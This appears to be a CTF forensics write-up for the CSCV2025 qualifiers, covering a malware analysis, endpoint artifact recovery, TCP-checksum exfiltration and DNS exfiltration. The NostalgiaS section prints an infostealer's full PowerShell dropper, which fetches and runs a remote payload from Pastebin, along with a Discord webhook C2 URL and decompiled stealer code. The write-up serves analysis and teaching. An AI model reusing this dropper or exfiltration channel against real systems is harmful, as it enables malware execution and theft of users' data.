---
title: CSCV2025Quals
published: 2025-10-23
description: ''
image: ''
tags: [Forensic,Traffic Analysis, Endpoint Analysis]
category: ''
draft: false 
lang: 'em'
---
# CSCV2025 Quals 
Author: KAiZ3n
![image](/images/hackmd/SkVt48wCxe.png)

# NostalgiaS
![image](/images/hackmd/H1kfCU80ex.png)

The challenge description does not specify the initial access vector, so we will proceed with a filesystem examination to gather more information.

First, I examined the machine's `winevtx` logs and found a suspicious PowerShell command with Event ID 400.
![image](/images/hackmd/SyELgKLAee.png)
![image](/images/hackmd/SyJ47YLCgl.png)

The script decodes a hex payload and decrypts it via XOR.
![image](/images/hackmd/SkNuQtLAge.png)
```powershell
$AssemblyUrl = "https://pastebin.com/raw/90qeYSHA"
$XorKey = 0x24
$TypeName = "StealerJanai.core.RiderKick"
$MethodName = "Run"

try {
    $WebClient = New-Object System.Net.WebClient
    $encodedContent = $WebClient.DownloadString($AssemblyUrl)
    $WebClient.Dispose()
    
    $hexValues = $encodedContent.Trim() -split ',' | Where-Object { $_ -match '^0x[0-9A-Fa-f]+$' }
    
    $encodedBytes = New-Object byte[] $hexValues.Length
    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        $encodedBytes[$i] = [Convert]::ToByte($hexValues[$i].Trim(), 16)
    }
    
    $originalBytes = New-Object byte[] $encodedBytes.Length
    for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
        $originalBytes[$i] = $encodedBytes[$i] -bxor $XorKey
    }
    
    $assembly = [System.Reflection.Assembly]::Load($originalBytes)
    
    if ($TypeName -ne "" -and $MethodName -ne "") {
        $targetType = $assembly.GetType($TypeName)
        $methodInfo = $targetType.GetMethod($MethodName, [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
        $methodInfo.Invoke($null, $null)
    }
    
} catch {
    exit 1
}
```
The script proceeds to download a malicious .NET assembly, XORs the payload with `0x24`, and executes it using `Assembly.Load`.
URL : https://pastebin.com/raw/90qeYSHA
Name : "StealerJanai.core.RiderKick"
![image](/images/hackmd/Syf74KLAlx.png)

Starting the analysis with ILSpy, we look into `StealerJani.Main()`.
![image](/images/hackmd/BJkKBF80ll.png)

**Execution Flow Summary:**
Main -> Run -> Initializes RiderKick constructor -> Sets up a Discord webhook URL and calls the AutoRun function.
URL :https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e

Inside `AutoRun`:
```csharp
// StealerJanai, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// StealerJanai.core.RiderKick
using System;
using System.Threading;

private void AutoRun()
{
	try
	{
		OutputDebugString("═══════════════════════════════════════════");
		OutputDebugString("   RIDER KICK");
		OutputDebugString("═══════════════════════════════════════════");
		OutputDebugString($"Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
		OutputDebugString($"Computer: {Environment.MachineName}");
		OutputDebugString("");
		SystemInformation systemInformation = new SystemInformation(discordSender.webhookUrl);
		systemInformation.CollectSystemInfo();
		systemInformation.SendToDiscordAsFile();
		Thread.Sleep(2000);
		BrowserDataCollector browserDataCollector = new BrowserDataCollector(discordSender.webhookUrl);
		browserDataCollector.CollectBrowserData();
		browserDataCollector.SendToDiscordAsFile();
	}
	catch (Exception ex)
	{
		OutputDebugString($"Error: {ex.Message}");
		OutputDebugString($"Stack Trace: {ex.StackTrace}");
	}
}

```
It will collect specified system and browser data and exfiltrate them to Discord, which acts as a C2, using the Webhook URL.

In `systemInformation.collectionSystemInfo()`, it collects `secretInformation`.
![image](/images/hackmd/rkIYPt8Rgx.png)
![image](/images/hackmd/SJRcDY8Cle.png)

The hardcoded strings are decoded through a function and assembled in the format: `text + machineName + "_" + text2 + registryValue + "}"`.

`DecodeMagicToString` is actually a Base62 decoding function.
```csharp
// StealerJanai, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// StealerJanai.component.systeminfo.SystemSecretInformationCollector
using System;
using System.Collections.Generic;
using System.Text;

private string DecodeMagicToString(string input)
{
	try
	{
		if (string.IsNullOrEmpty(input))
		{
			return string.Empty;
		}
		List<byte> list = new List<byte>();
		foreach (char value in input)
		{
			int num = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".IndexOf(value);
			if (num < 0)
			{
				return "Invalid character";
			}
			int num2 = num;
			for (int num3 = list.Count - 1; num3 >= 0; num3--)
			{
				int num4 = list[num3] * 62 + num2;
				list[num3] = (byte)(num4 % 256);
				num2 = num4 / 256;
			}
			while (num2 > 0)
			{
				list.Insert(0, (byte)(num2 % 256));
				num2 /= 256;
			}
		}
		int j;
		for (j = 0; j < list.Count && list[j] == 0; j++)
		{
		}
		if (j >= list.Count)
		{
			return string.Empty;
		}
		byte[] array = new byte[list.Count - j];
		for (int k = 0; k < array.Length; k++)
		{
			array[k] = list[j + k];
		}
		return Encoding.ASCII.GetString(array);
	}
	catch (Exception ex)
	{
		return "Decode error: " + ex.Message;
	}
}

```
Proceeding to decode the hardcoded strings and retrieve the MachineName as well as the registry value from `SOFTWARE\hensh1n`.
![image](/images/hackmd/ByH2stICle.png)

SYSTEM machine Name value:
![image](/images/hackmd/H1NMhFLCgx.png)

Two hardcoded Base62 strings:
-> CSCV2025{your_computer_
-> has_be3n_kicked_by

=> Flag: CSCV2025{your_computer_DataDESKTOP-47ICHL6_has_be3n_kicked_byHxrYJgdu}

---

## IOC List

*   **URL (Payload):** `https://pastebin.com/raw/90qeYSHA`
*   **URL (C2):** `https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e`
*   **File Name (In-Memory):** `StealerJanai.dll` (Inferred from TypeName)
*   **Registry Key:** `HKEY_CURRENT_USER\SOFTWARE\hensh1n`
*   **PowerShell Command Snippet:** `(New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/90qeYSHA')`
*   **.NET TypeName:** `StealerJanai.core.RiderKick`
*   **.NET MethodName:** `Run`
*   **XOR Key:** `0x24`

## Logical Attack Conclusion

The attack originates from a PowerShell script, likely executed by the user. This script acts as a dropper, fetching a second-stage payload from Pastebin. The payload is a hex-encoded string which, after being decoded and XORed with the key `0x24`, is loaded as a .NET assembly (`StealerJanai.dll`) in memory.

The malware, `StealerJanai`, is an infostealer. Upon execution, it gathers system information (including the computer name) and browser data. It also retrieves a specific value from the registry key `HKEY_CURRENT_USER\SOFTWARE\hensh1n`. This collected data, including parts of the final flag, is then exfiltrated to a hardcoded Discord webhook URL, which serves as the command-and-control (C2) server. The final flag is constructed by combining decoded strings with the victim's machine name and the retrieved registry value.

# Case AlphaS

![image](/images/hackmd/ryWylcU0le.png)
![image](/images/hackmd/SkXGlcI0lg.png)

According to the description, we have a timeline for the incident response, an attacker's drive, and an external drive from the victim that has been encrypted with BitLocker.
We observed that the Windows user downloaded artifacts recently, likely within the timeframe of the incident.
![image](/images/hackmd/Hk8hbqUAel.png)

I will focus on application artifacts first. SimpleNote seems likely to contain important notes.
Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield any results. I was stuck on this for a while, but upon further investigation, I found that logs from SimpleNote and ChatGPT were saved in plaintext.
![image](/images/hackmd/B1_SIVD0gg.png)
![image](/images/hackmd/H1Wd8NPCll.png)

**Log Paths:**
*   `%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log`
*   `%APPDATA%\Local\Microsoft\Packages\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\LocalCache\Roaming\ChatGPT\IndexedDB\https_chatgpt.com_0.indexeddb.leveldb\0003.log`

**Findings:**
*   Obtained Gmail address: `tangthanhvan56@gmail.com`
*   Obtained a password for a zip file.
![iamge](/images/hackmd/rJd8tVP0gx.png)

![image](/images/hackmd/BkMbbrwCel.png)

*   Obtained the BitLocker recovery key from ChatGPT logs. Used Autopsy to read the external drive.

After decrypting with the recovery key, we found a `secret.zip` file. Using the password recovered from the SimpleNote logs, we unzipped the file.
![image](/images/hackmd/SkHfnNDRge.png)
![image](/images/hackmd/HJqO3NP0gx.png)

Reading the `ssh.txt` file revealed a link to Pastebin.
```
# access via vpn or proxy if you are blocked
https://pastebin.com/WciYiDEs

cff4c6f0b68c31cb
```
![image](/images/hackmd/Sy4hnVDAgg.png)

And we obtained the flag.

---

## IOC Report

*   **Email:** `tangthanhvan56@gmail.com`
*   **File Paths:**
    *   `%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log`
    *   `%APPDATA%\Local\Microsoft\Packages\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\LocalCache\Roaming\ChatGPT\IndexedDB\https_chatgpt.com_0.indexeddb.leveldb\\0003.log`
*   **File Name:** `secret.zip`
*   **URL:** `https://pastebin.com/WciYiDEs`
*   **Potential Credential:** `cff4c6f0b68c31cb`



# CovertS

![image](/images/hackmd/HJXUZHPAel.png)

Based on the challenge description, the scenario involves data exfiltration, and the provided PCAP file is quite large.

```
┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/forensics-Covert-7afc4ba9ad51f576437a2c204831153a (1)]
└─$ capinfos challenge.pcapng
File name:           challenge.pcapng
File type:           Wireshark/... - pcapng
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: (not set)
Number of packets:   1,028 k
File size:           1,173 MB
Data size:           1,138 MB
Capture duration:    724.631207 seconds
Earliest packet time: 2025-10-17 12:55:21.034865
Latest packet time:   2025-10-17 13:07:25.666072
Data byte rate:      1,571 kBps
Data bit rate:       12 Mbps
Average packet size: 1107.30 bytes
Average packet rate: 1,419 packets/s
SHA256:              e7f91469cfb05be3d485c7fb5881bdf54d9ad011f4dbdc34e991f8bc8bd8bab4
SHA1:                f5cb15284d47ec909134e8be7934c518a6dd7ee3
Strict time order:   False
Capture hardware:    Intel(R) Core(TM) i5-14600KF (with SSE4.2)
Capture oper-sys:    64-bit Windows 11 (25H2), build 26200
Capture application: Dumpcap (Wireshark) 4.6.0 (v4.6.0-0-gcdfb6721e77c)
Number of interfaces in file: 1
Interface #0 info:
                     Name = \Device\NPF_{B2C223B5-86D4-416A-8D08-EF888EEDF278}
                     Description = vEthernet (WSL (Hyper-V firewall))
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 262144
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Operating system = 64-bit Windows 11 (25H2), build 26200
                     Number of stat entries = 1
                     Number of packets = 1028287

```

Due to the large file size, I segregated the traffic into three smaller files based on protocol: TCP, UDP, and ICMP.

Upon analyzing the ICMP traffic, I identified exfiltration attempts. However, the payloads consisted solely of the character "A," suggesting a potential diversion or an attempt to create noise and obstruct the analysis.
![image](/images/hackmd/rJ9ONBwRge.png)

Therefore, I decided to deprioritize the ICMP traffic.

The UDP traffic primarily consisted of the QUIC protocol. Payloads transmitted over QUIC are heavily encrypted, and there were no discernible signs of data exfiltration.
![image](/images/hackmd/BkUISHvAxx.png)

Consequently, the investigation shifted its focus to the TCP protocol.

[Reference Document](https://medium.com/@hhkolberg/how-i-used-tcp-headers-to-exfiltrate-data-a-simple-but-powerful-learning-exercise-7d9812ce81c1)

Drawing inspiration from the referenced blog post, my initial approach was to filter for TCP SYN packets on ports other than 443. This strategy aimed to exclude HTTPS traffic, where the TLS handshake occurs over port 443, thereby narrowing the scope of the investigation.

![image](/images/hackmd/SJkRDSvAxe.png)

In a packet with source IP `192.168.203.91` and destination IP `192.168.192.1`, using ports 20981 and 3239, I observed that the TCP checksum field contained two characters that appeared to be part of a Base64 encoded string. I proceeded to dump this data using `tshark`.

```
└─$ tshark -r tcp.pcap -Y "ip.addr==192.168.192.1 && ip.addr==192.168.203.91" -Tfields -e tcp.checksum > out
```

After hex decoding, it was evident that the string was Base64 encoded.

```
SGVsbG8gZXZlcnlvbmUsDQpIb3cgYXJlIHlvdSBkb2luZz8gQSB2ZXJ5IHdhcm0gd2VsY29tZSB0byBDU0NWMjAyNSENCg0KSSdtIHJlYWxseSBnbGFkIHRvIHNlZSB5b3UgaGVyZSBhbmQgSSBob3BlIHlvdSdyZSByZWFkeSBmb3IgYW4gZXhjaXRpbmcgZXZlbnQgYWhlYWQuIFRoaXMgQ1RGIGlzIGFsbCBhYm91dCBjaGFsbGVuZ2luZyB5b3VyIHNraWxscywgbGVhcm5pbmcgbmV3IHRyaWNrcywgYW5kIG9mIGNvdXJzZSAtIGhhdmluZyBmdW4gYWxvbmcgdGhlIHdheS4gQ29uc2lkZXIgdGhpcyBsaXR0bGUgbWVzc2FnZSBub3QgYXMgYSBjaGFsbGVuZ2UgaXRzZWxmLCBidXQgc2ltcGx5IGFzIG15IHdheSBvZiBzYXlpbmcgaGVsbG8gdG8gYWxsIG9mIHlvdSBhbWF6aW5nIHBsYXllcnMuDQoNClRha2UgYSBtb21lbnQsIGdldCBjb21mb3J0YWJsZSwgYW5kIGVuam95IHRoZSByaWRlLiBXaGV0aGVyIHlvdSdyZSBoZXJlIHRvIGNvbXBldGUgZmllcmNlbHksIHRvIGxlYXJuIHNvbWV0aGluZyBuZXcsIG9yIGp1c3QgdG8gaGF2ZSBhIGdvb2QgdGltZSwgSSBob3BlIENTQ1YyMDI1IHdpbGwgYmUgYW4gdW5mb3JnZXR0YWJsZSBleHBlcmllbmNlIGZvciB5b3UgKG5vdCB0aGlzIGNoYWxsZW5nZSwgcGxzIGZvcmdldCB0aGlzIHNoKnQgT19PKQ0KDQpBbmQgbm93LCB3aXRob3V0IGtlZXBpbmcgeW91IHdhaXRpbmcgYW55IGxvbmdlci4uLg0KDQooc29tZW9uZSBhY2NpZGVudGFsbHkgc2VudCBteSBjaGFsIHZpYSBlbWFpbCBzbyBoZXJlIGlzIHlvdXIgbmV3IGZsYWc6KQ0KDQpDU0NWMjAyNXtteV9jaGFsX2dvdF9sZWFrZWRfYmVmb3JlX3RoZV9jb250ZXN0X2JydWhfaGVyZV9pc195b3VyX25ld19mbGFnX2I4ODkxYzRlMTQ3YzQ1MmI4Y2M2NjQyZjEwNDAwNDUyfQ0KDQpeX14gc3J5IGZvciB0aGUgbWVzcw==
```

```
Hello everyone,
How are you doing? A very warm welcome to CSCV2025!

I'm really glad to see you here and I hope you're ready for an exciting event ahead. This CTF is all about challenging your skills, learning new tricks, and of course - having fun along the way. Consider this little message not as a challenge itself, but simply as my way of saying hello to all of you amazing players.

Take a moment, get comfortable, and enjoy the ride. Whether you're here to compete fiercely, to learn something new, or just to have a good time, I hope CSCV2025 will be an unforgettable experience for you (not this challenge, pls forget this sh*t O_O)

And now, without keeping you waiting any longer...

(someone accidentally sent my chal via email so here is your new flag:)

CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}

^_^ sry for the mess
```

Flag: `CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}`


# DNS Exfil
![image](/images/hackmd/Sk0V9SDRxe.png)
![image](/images/hackmd/Hyl_qHvAxl.png)

This report details the analysis of a data exfiltration attempt using DNS queries. The investigation focuses on dissecting network traffic and correlating it with server logs to understand the attacker's methodology.

## Initial Network Traffic Analysis
The investigation began by examining the provided PCAP file (`10.10.0.53_ns_capture.pcap`) using `tshark`. The first step was to extract all DNS query names to identify any unusual patterns.
```
┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
└─$ tshark -r "dnsexfil/10.10.0.53_ns_capture.pcap" -Tfields -e dns.qry.name
```
![image](/images/hackmd/ByzNsBwRee.png)

Suspicious queries to a domain, `cloudflar3.com`, were identified. The following command was used to filter for these specific queries and extract relevant metadata, including the full query name, source/destination IPs, and timestamp.
```
──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
└─$ tshark -r "dnsexfil/10.10.0.53_ns_capture.pcap" -Y "dns.qry.name contains \"cloudflar3\"" -Tfields -e dns.qry.name -e ip.src -e ip.dst  -e frame.time
p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.192821000 +07
p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.212821000 +07
p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.426899000 +07
p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.446899000 +07
p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.497508000 +07
p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.517508000 +07
p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.599459000 +07
p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.619459000 +07
f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:03.714885000 +07
f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:03.734885000 +07
f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:03.769962000 +07
f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:03.789962000 +07
```

The subdomains appeared to be hex-encoded data. The timeline of these events, starting around **Oct 15, 2025 13:24:00 UTC+7**, was noted for correlation with other data sources.

## Log Correlation and Server Analysis
Pivoting to the destination IP address, `10.10.5.80`, an analysis of server logs was conducted. The access and error logs for the webserver were found to have entries corresponding to the timeline of the suspicious DNS traffic.

The access log revealed a connection to an administrative page from the IP address `10.55.1.77`.
![image](/images/hackmd/S1U5THP0ll.png)

Simultaneously, the error log showed a large file upload error directed at `intra.portal.local`. This indicates a potential web shell upload or data staging attempt.
![image](/images/hackmd/HkBoASwRge.png)

Further investigation of the `intra.portal.local` domain confirmed the upload of a PHP web shell named `getfile.php`.
![image](/images/hackmd/H1RaJUPCeg.png)
![image](/images/hackmd/Sk-mgLP0xx.png)

## Decryption of Exfiltrated Data
A debug variable found on the server provided the key to understanding the exfiltrated data:
`DEBUG VARS: APP_SECRET=F0r3ns1c-2025-CSCV; DATE_UTC=20251010`
`H=SHA256(APP_SECRET); AES_KEY=H[0..15]; AES_IV=H[16..31];`

This indicates that the exfiltrated data seen in the DNS query subdomains is likely encrypted. The payload is constructed using an AES key derived from the SHA256 hash of the `APP_SECRET`.

The structure of the DNS payload was analyzed.
![image](/images/hackmd/S15sW8v0ge.png)

The hex-encoded string in the subdomain is split to separate the ciphertext from another component, possibly an IV or a MAC.
```python
>>> a = "5769179ccdf950443501d9978f52ddb51b70ca0d4f607a976c6639914af7c7a6"
>>> print(a[32:])
1b70ca0d4f607a976c6639914af7c7a6
>>> print(a[:32])
5769179ccdf950443501d9978f52ddb5
```
By using the discovered `APP_SECRET` and understanding the payload structure, the encrypted data can be reconstructed and decrypted.
![image](/images/hackmd/SJcqbLPCxe.png)

```